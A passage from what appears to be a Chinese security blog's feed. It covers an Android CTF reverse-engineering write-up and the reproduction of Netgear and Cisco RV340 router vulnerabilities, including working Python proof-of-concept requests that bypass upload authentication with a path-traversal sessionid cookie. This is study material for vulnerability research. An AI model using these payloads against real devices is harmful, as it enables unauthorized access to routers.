class="keyword">for</span> (Signature signature : signatureArr) &#123;</span><br><span class="line">            messageDigest.update(signature.toByteArray()); <span class="comment">// 遍历所有签名并更新哈希值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] digest = messageDigest.digest(); <span class="comment">// 最终md5哈希</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : digest) &#123; <span class="comment">// 将字节数组转换为十六进制字符串</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> b &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                sb.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(Integer.toHexString(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString(); <span class="comment">// 返回string</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException | NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">// android.support.v4.a.k, android.app.Activity</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> i2, Intent intent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onActivityResult(i, i2, intent);</span><br><span class="line">    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> (intent != <span class="literal">null</span>) &#123;</span><br><span class="line">                String[] strArr = &#123;<span class="string">&quot;_data&quot;</span>&#125;;</span><br><span class="line">                <span class="type">Cursor</span> <span class="variable">query</span> <span class="operator">=</span> getContentResolver().query(intent.getData(), strArr, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                query.moveToFirst();</span><br><span class="line">                <span class="type">String</span> <span class="variable">file_path</span> <span class="operator">=</span> query.getString(query.getColumnIndex(strArr[<span class="number">0</span>])); <span class="comment">// 源文件路径</span></span><br><span class="line">                query.close();</span><br><span class="line">                enc(file_path, getFilesDir().getAbsolutePath() + file_path.substring(file_path.lastIndexOf(<span class="string">&quot;/&quot;</span>)) + <span class="string">&quot;.lock&quot;</span>, j());</span><br><span class="line">                i();</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, String.format(<span class="string">&quot;%s encrypting&quot;</span>, file_path), <span class="number">1</span>).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">// android.support.v7.app.c, android.support.v4.a.k, android.app.Activity</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    findViewById(R.id.encrypt).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.a.sample.picturelock.MainActivity.1</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.a(<span class="built_in">this</span>, <span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>) != <span class="number">0</span>) &#123; <span class="comment">// 判断是否有写入外部存储权限</span></span><br><span class="line">                android.support.v4.a.a.a((Activity) <span class="built_in">this</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>&#125;, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.PICK&quot;</span>, (Uri) <span class="literal">null</span>); <span class="comment">// 动作</span></span><br><span class="line">            intent.setDataAndType(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, <span class="string">&quot;image/*&quot;</span>); <span class="comment">// 间接调用了MediaStore内容提供器</span></span><br><span class="line">            MainActivity.<span class="built_in">this</span>.startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    findViewById(R.id.refresh).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.a.sample.picturelock.MainActivity.2</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            MainActivity.<span class="built_in">this</span>.i();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    i();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看native层的enc函数 参数(文件的真实路径，目标路径，文件签名的md5)，第三个参数可以hook看一眼即可得到：<code>f8c49056e4ccf9a11e090eaf471f418d</code></p><p>不hook也可以直接得到</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PS D:\android_re\CTF\wiki\picture&gt; apksigner verify --verbose --print-certs picturelock.<span class="function">apk</span></span><br><span class="line"><span class="function">Verifies</span></span><br><span class="line"><span class="function">Verified <span class="keyword">using</span> v1 <span class="title">scheme</span> <span class="params">(JAR signing)</span>: true</span></span><br><span class="line"><span class="function">Verified using v2 scheme (APK Signature Scheme v2): true</span></span><br><span class="line"><span class="function">Verified using v3 scheme (APK Signature Scheme v3): false</span></span><br><span class="line"><span class="function">Verified using v3<span class="number">.1</span> scheme (APK Signature Scheme v3<span class="number">.1</span>): false</span></span><br><span class="line"><span class="function">Verified using v4 scheme (APK Signature Scheme v4): false</span></span><br><span class="line"><span class="function">Verified for SourceStamp: false</span></span><br><span class="line"><span class="function">Number of signers: <span class="number">1</span></span></span><br><span class="line"><span class="function">Signer #<span class="number">1</span> certificate DN: CN=</span>a, OU=b, O=c, L=d, ST=e, C=ff</span><br><span class="line">Signer #<span class="number">1</span> certificate SHA<span class="number">-256</span> digest: ba12c13fd60e0def17ae3aee4e6a816782d0367ff02e37ccad5d6e86870c8e38</span><br><span class="line">Signer #<span class="number">1</span> certificate SHA<span class="number">-1</span> digest: <span class="number">48e7045</span>ee60d9d8a257c5275e3650609a5cca13e</span><br><span class="line">Signer #<span class="number">1</span> certificate MD5 digest: f8c49056e4ccf9a11e090eaf471f418d</span><br><span class="line">Signer #<span class="number">1</span> key algorithm: RSA</span><br><span class="line">Signer #<span class="number">1</span> key <span class="built_in">size</span> (bits): <span class="number">2048</span></span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key SHA<span class="number">-256</span> digest: <span class="number">4</span>de55872bc804bf5fccc61c6e42377b24cd6eefc183a800c5807f759f7f9796d</span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key SHA<span class="number">-1</span> digest: dba8196f6f49a1d1291e4c03102bc7225b6f1f25</span><br><span class="line">Signer #<span class="number">1</span> <span class="keyword">public</span> key MD5 digest: d246e0ae52179dfe9daca889ee3133ef</span><br></pre></td></tr></table></figure><p>看到<code>Signer #1 certificate MD5 digest: f8c49056e4ccf9a11e090eaf471f418d</code>就能得到</p><p>so程序的enc程序在调试的时候，老是出现错误，因此就在此留下一个小坑吧，等我变强之后再回来搞定😎</p><h1 id="android逆向之动态调试"><a href="#android逆向之动态调试" class="headerlink" title="android逆向之动态调试"></a>android逆向之动态调试</h1><h2 id="java层调试"><a href="#java层调试" class="headerlink" title="java层调试"></a>java层调试</h2><p>工具：android studio、apktools、smalidea、已经root的手机</p><p>首先apktools反编译apk为output</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk -o output</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb shell #adb进入命令行模式</span><br><span class="line">su #切换至超级用户</span><br><span class="line">magisk resetprop ro.debuggable 1</span><br><span class="line">stop</span><br><span class="line">start #一定要通过该方式重启</span><br></pre></td></tr></table></figure><p>设置手机的ro.debuggable为1，这样任何程序都可以在我们的手机上进行调试（但是缺点就是每次重启都会失效，因此在启动之后都要设置一次</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell ps</span><br></pre></td></tr></table></figure><p>找到对应的调试进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u0_a137       9261  7805 1120068  56804 SyS_epoll_wait      0 S com.a.sample.picturelock</span><br></pre></td></tr></table></figure><p>PID为9261</p><p>因此设置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Lenovo&gt; adb forward tcp:<span class="number">8700</span> jdwp:<span class="number">9261</span></span><br><span class="line"><span class="number">8700</span></span><br></pre></td></tr></table></figure><p>这个8700是android studio中设置的</p><p>来到android studio中</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456734.png" alt="image-20250414101310778" style="zoom: 33%;" /><p>设置如上的部分，output是apktool反编译apk为smali的文件，其中output中的smali文件夹要将其Mark为Sources Root权限</p><p>之后直接到output中进行调试即可</p><h2 id="原生层调试"><a href="#原生层调试" class="headerlink" title="原生层调试"></a>原生层调试</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.a.sample.picturelock/.MainActivity</span><br></pre></td></tr></table></figure><p>然后在adb shell中push进去ida&#x2F;dbgsrv下对应的server，运行，自动监听 23946 port</p><p>然后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:<span class="number">23946</span> tcp:<span class="number">23946</span></span><br></pre></td></tr></table></figure><p>将PC端的端口转发到手机上对应的服务端口</p><p>之后ida</p><p><code>Debug-&gt;attach-&gt;localhost:23946</code></p><p>选中对应的服务即成功attack上</p><p>然后android studio也attach上java层即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;静态分析java层&quot;&gt;&lt;a href=&quot;#静态分析java层&quot; class=&quot;headerlink&quot; title=&quot;静态分析java层&quot;&gt;&lt;/a&gt;静态分析java层&lt;/h1&gt;&lt;h2 id=&quot;2014-ASIS-Cyber-Security-Contest-Fina</summary>
      
    
    
    
    <category term="安卓逆向" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>一些IoT漏洞复现</title>
    <link href="http://s1nec-1o.github.io/2025/04/06/%E4%B8%80%E4%BA%9BIoT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2025/04/06/%E4%B8%80%E4%BA%9BIoT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-04-06T14:45:13.000Z</published>
    <updated>2025-04-06T15:49:48.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些路由器漏洞复现"><a href="#一些路由器漏洞复现" class="headerlink" title="一些路由器漏洞复现"></a>一些路由器漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一些漏洞的学习笔记，比较的潦草，只是记录一下😊😊😊😊</p><h2 id="CVE-2024-52028"><a href="#CVE-2024-52028" class="headerlink" title="CVE-2024-52028"></a><a href="https://www.cve.org/CVERecord?id=CVE-2024-52028">CVE-2024-52028</a></h2><p>Netgear R7000P v1.3.3.154 被发现通过 wiz_pptp.cgi 上的 pptp_user_netmask 参数存在堆栈溢出。此漏洞允许攻击者通过精心设计的 POST 请求引发拒绝服务 (DoS)。</p><p>固件链接：<a href="https://www.netgear.com/support/product/r7000p/#download">https://www.netgear.com/support/product/r7000p/#download</a></p><p>usr&#x2F;sbin&#x2F;httpd</p><p>没找到！</p><p>Netgear XR300 v1.0.3.78、R7000P v1.3.3.154 和 R6400 v2 1.0.4.128 被发现通过 bsw_pppoe.cgi 的 pppoe_localip 参数包含堆栈溢出。此漏洞允许攻击者通过精心设计的 POST 请求引发拒绝服务 (DoS)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">case 4:</span><br><span class="line">  if ( input_length &gt; *limits )</span><br><span class="line">    return -1;</span><br><span class="line">  for ( check_index2 = 0; check_index2 &lt; input_length; ++check_index2 )</span><br><span class="line">  &#123;</span><br><span class="line">    char_code4 = (unsigned __int8)input_str[check_index2];</span><br><span class="line">    is_invalid_number4 = char_code4 &gt; &#x27;.&#x27;;</span><br><span class="line">    if ( char_code4 != &#x27;.&#x27; )</span><br><span class="line">      is_invalid_number4 = (unsigned __int8)(char_code4 - &#x27;0&#x27;) &gt; 9u;</span><br><span class="line">    if ( is_invalid_number4 )</span><br><span class="line">      return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  sscanf(input_str, &quot;%[^.].%[^.].%[^.].%s&quot;, ip_buffer1, ip_buffer2, ip_buffer3, ip_buffer4); </span><br><span class="line">    //栈溢出</span><br><span class="line">  if ( !ip_buffer1[0] )</span><br><span class="line">    return -1;</span><br><span class="line">  if ( strlen(ip_buffer1) &gt; 3 )</span><br><span class="line">    return -1;</span><br></pre></td></tr></table></figure><p><code>input_str</code>最大长度为2048，但是<code>ip_buffer1-4</code>的长度都很小，且没有开始的判断，数字的溢出Dos</p><h2 id="CVE-2022-20705"><a href="#CVE-2022-20705" class="headerlink" title="CVE-2022-20705"></a>CVE-2022-20705</h2><p><strong>RV340的环境搭建：</strong>从报错出发，尝试解决影响较大的报错，辅以调试或者寻找资料<strong><a href="https://www.yuque.com/cyberangel/rg9gdm/zz75e4">https://www.yuque.com/cyberangel/rg9gdm/zz75e4</a></strong></p><p>Cisco Small Business RV160、RV260、RV340 和 RV345 系列路由器中的多个漏洞可能允许攻击者执行以下任何操作：<strong>执行任意代码、提升权限、执行任意命令、绕过身份验证和授权保护、获取并运行未签名的软件、导致拒绝服务 (DoS)</strong> </p><p>该CVE主要是利用了nginx配置不恰当导致的授权绕过漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">location /form-file-upload &#123;</span><br><span class="line">    include uwsgi_params;</span><br><span class="line">    proxy_buffering off;</span><br><span class="line">    uwsgi_modifier1 9;</span><br><span class="line">    uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">    uwsgi_read_timeout 3600;</span><br><span class="line">    uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /upload &#123;</span><br><span class="line">    set $deny 1;</span><br><span class="line"></span><br><span class="line">        if (-f /tmp/websession/token/$cookie_sessionid) &#123;</span><br><span class="line">                set $deny &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($deny = &quot;1&quot;) &#123;</span><br><span class="line">                return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    upload_pass /form-file-upload;</span><br><span class="line">    upload_store /tmp/upload;</span><br><span class="line">    upload_store_access user:rw group:rw all:rw;</span><br><span class="line">    upload_set_form_field $upload_field_name.name &quot;$upload_file_name&quot;;</span><br><span class="line">    upload_set_form_field $upload_field_name.content_type &quot;$upload_content_type&quot;;</span><br><span class="line">    upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;;</span><br><span class="line">    upload_aggregate_form_field &quot;$upload_field_name.md5&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">    upload_aggregate_form_field &quot;$upload_field_name.size&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">    upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">    upload_cleanup 400 404 499 500-505;</span><br><span class="line">    upload_resumable on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为$cookie_sessionid可控，所以可以将其指向..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，就可以绕过登录。该问题产生的根本原因在于($cookie_sessionid可控导致目录穿越)</p><p>写个Poc测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers_1=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=cyberangel&#x27;&#125;                 # 非法的sessionid</span><br><span class="line">headers_2=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd&#x27;&#125;        # 伪造的sessionid</span><br><span class="line">r_1 = requests.post(url,headers=headers_1,verify=False)</span><br><span class="line">r_2 = requests.post(url,headers=headers_2,verify=False)</span><br><span class="line">print(r_1.text)</span><br><span class="line">print(&quot;-&quot;*50)</span><br><span class="line">print(r_2.text)</span><br><span class="line">r_1.close()</span><br><span class="line">r_2.close()</span><br><span class="line">~/fr/_/_/_f/_/_openwrt-comcerto2000-hgw-r/ubifs-root/1161918421 --------------------------------------------------------------</span><br><span class="line">&gt; python3 test1.py                                                                                   </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以发现换了一种报错，说明就是绕过去了，但是后续还有检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_pass /form-file-upload;</span><br></pre></td></tr></table></figure><p>指定当文件上传完成后，将请求转发到 <code>/form-file-upload</code> 路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location /form-file-upload &#123;</span><br><span class="line">    include uwsgi_params;</span><br><span class="line">    proxy_buffering off;</span><br><span class="line">    uwsgi_modifier1 9;</span><br><span class="line">    uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">    uwsgi_read_timeout 3600;</span><br><span class="line">    uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了uwsgi_params，通过127.0.0.1:9003，全局搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">plugins = cgi</span><br><span class="line">workers = 1</span><br><span class="line">master = 1</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">socket=127.0.0.1:9003</span><br><span class="line">buffer-size=4096</span><br><span class="line">cgi = /www/cgi-bin/upload.cgi</span><br><span class="line">cgi-allowed-ext = .cgi</span><br><span class="line">cgi-allowed-ext = .pl</span><br><span class="line">cgi-timeout = 300</span><br><span class="line">ignore-sigpipe = true</span><br></pre></td></tr></table></figure><p>调用upload.cgi对其进行处理，分析upload.cgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if ( httpCookieEnv )</span><br><span class="line"> &#123;</span><br><span class="line">   StrBufSetStr(parsedCookieBuffer, httpCookieEnv);</span><br><span class="line">   httpCookieEnv = 0;</span><br><span class="line">   cookieValue = (char *)StrBufToStr(parsedCookieBuffer);</span><br><span class="line">   for ( parsedToken = strtok_r(cookieValue, &quot;;&quot;, &amp;strtokSavePtr);</span><br><span class="line">         parsedToken;</span><br><span class="line">         parsedToken = strtok_r(0, &quot;;&quot;, &amp;strtokSavePtr) )// strtok对每一个;进行切割，并传递;前的参数</span><br><span class="line">   &#123;</span><br><span class="line">     sessionIdPtr = strstr(parsedToken, &quot;sessionid=&quot;);// 找到;sessionid=</span><br><span class="line">     if ( sessionIdPtr )</span><br><span class="line">       httpCookieEnv = sessionIdPtr + 10;      // 这是sessionid=value的value</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>此处从httpCookie寻找;sessionid&#x3D;value</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">else if ( !strcmp(requestUriEnv, &quot;/upload&quot;)</span><br><span class="line">       &amp;&amp; httpCookieEnv</span><br><span class="line">       &amp;&amp; strlen(httpCookieEnv) - 0x10 &lt;= 0x40// sessionid的长度&lt;=0x40</span><br><span class="line">       &amp;&amp; !match_regex(&quot;^[A-Za-z0-9+=/]*$&quot;, httpCookieEnv) )// 正则匹配，字母和数字</span><br><span class="line">&#123;</span><br><span class="line">  destinationParsed = parsedDestinationBuffer;</span><br><span class="line">  uploadOption = parsedOptionBuffer;</span><br><span class="line">  parameterType = parsedFileTypeBuffer;</span><br><span class="line">  completeFileBufferPath = StrBufToStr(filePathWrapperBuffer);</span><br><span class="line">  sub_12684(</span><br><span class="line">    httpCookieEnv,</span><br><span class="line">    destinationParsed,</span><br><span class="line">    uploadOption,</span><br><span class="line">    parameterType,</span><br><span class="line">    completeFileBufferPath,</span><br><span class="line">    parsedCertNameBuffer,</span><br><span class="line">    parsedCertTypeBuffer,</span><br><span class="line">    parsedPasswordBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求存在sessionid，因此还要设置sessionid</p><p>如此便可未授权上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import request</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd;sessionid=&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349438.png" alt="image-20250226195154748"></p><p>浏览器cookie条目为：Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA&#x3D;（base64解码为cisco&#x2F;192.168.121.138&#x2F;2220）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@Router:~/rootfs/tmp/websession# cat session</span><br><span class="line">&#123;</span><br><span class="line">  &quot;max-count&quot;:1,</span><br><span class="line">  &quot;cisco&quot;:&#123;</span><br><span class="line">    &quot;Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA=&quot;:&#123;</span><br><span class="line">      &quot;user&quot;:&quot;cisco&quot;,</span><br><span class="line">      &quot;group&quot;:&quot;admin&quot;,</span><br><span class="line">      &quot;time&quot;:2344,</span><br><span class="line">      &quot;access&quot;:1,</span><br><span class="line">      &quot;timeout&quot;:1800,</span><br><span class="line">      &quot;leasetime&quot;:0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;root@Router:~/rootfs/tmp/websession# cat ./token/Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA\= </span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA=;&#x27;&#125;</span><br><span class="line">r = requests.post(url,headers=headers,verify=False)</span><br><span class="line">print(r.text)</span><br><span class="line">~/fr/_/_/_f/_/_openwrt-comcerto2000-hgw-r/ubifs-root/1161918421 --------------------------------------------------------------</span><br><span class="line">&gt; python3 test2.py</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad 